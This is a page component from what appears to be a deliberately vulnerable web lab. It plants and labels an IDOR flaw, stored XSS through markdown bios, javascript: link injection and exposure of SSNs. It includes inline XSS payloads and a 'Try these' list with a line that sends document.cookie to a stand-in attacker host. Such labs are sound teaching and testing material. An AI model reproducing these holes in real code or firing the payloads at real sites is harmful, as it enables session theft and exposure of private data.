/**
 *   V-WEB-05  CWE-639  IDOR — any profile id is readable, no session check
 *   V-WEB-06  CWE-79   Bio rendered as unsanitised markdown (marked 0.3.6)
 *   V-WEB-07  CWE-79   Profile link href accepts javascript: URLs
 *   V-WEB-08  CWE-359  SSN and balance rendered to anyone who asks
 */

import { getUserByEmail, allUsers, getNoteById } from '@vulnlab/db';
import { Markdown, UserLink, Avatar, DebugPanel } from '@vulnlab/ui';

export const dynamic = 'force-dynamic';

// Attacker-controlled "bio" content, as if it had been stored by the user.
const BIOS = {
  1: "Hi, I'm Alice. <img src=x onerror=\"document.title='xss-1'\"> [my site](javascript:alert('link-xss'))",
  2: 'Bob here. Nothing to see.',
  3: 'Administrator account. <script>document.title="xss-admin"</script>',
};

export default function ProfilePage({ params, searchParams }) {
  const id = params.id;

  // V-WEB-05 (CWE-639): no authentication, no ownership check — the URL is
  // the only thing standing between a visitor and someone else's record.
  const user = allUsers().find((u) => String(u.id) === String(id));
  const note = getNoteById(id);

  if (!user) {
    return (
      <>
        <h1>Profile {id}</h1>
        <p className="sub">No such user.</p>
      </>
    );
  }

  const avatar = searchParams?.avatar || 'https://placehold.co/48';
  const website = searchParams?.website || 'https://vulnlab.test';

  return (
    <>
      <h1>{user.email}</h1>
      <p className="sub">
        <span className="tag cwe">CWE-639</span>
        <span className="tag cwe">CWE-79</span>
        <span className="tag cwe">CWE-359</span>
      </p>

      {/* V-WEB-07 (CWE-79): scheme never validated */}
      <Avatar src={avatar} alt="avatar" />
      <p><UserLink href={website} label="personal site" /></p>

      {/* V-WEB-06 (CWE-79) */}
      <div className="card">
        <h3>Bio</h3>
        <Markdown source={BIOS[id] || 'No bio.'} />
      </div>

      {/* V-WEB-08 (CWE-359): PII exposed with no authorisation */}
      <div className="card">
        <h3>Account details</h3>
        <DebugPanel data={{ ...user, privateNote: note && note.body }} />
      </div>

      <h2>Try these</h2>
      <pre>{`/profile/3                      → read the admin's SSN and private note
/profile/1?avatar=javascript:alert(1)
/profile/1?website=javascript:fetch('//attacker/?c='%2Bdocument.cookie)`}</pre>
    </>
  );
}
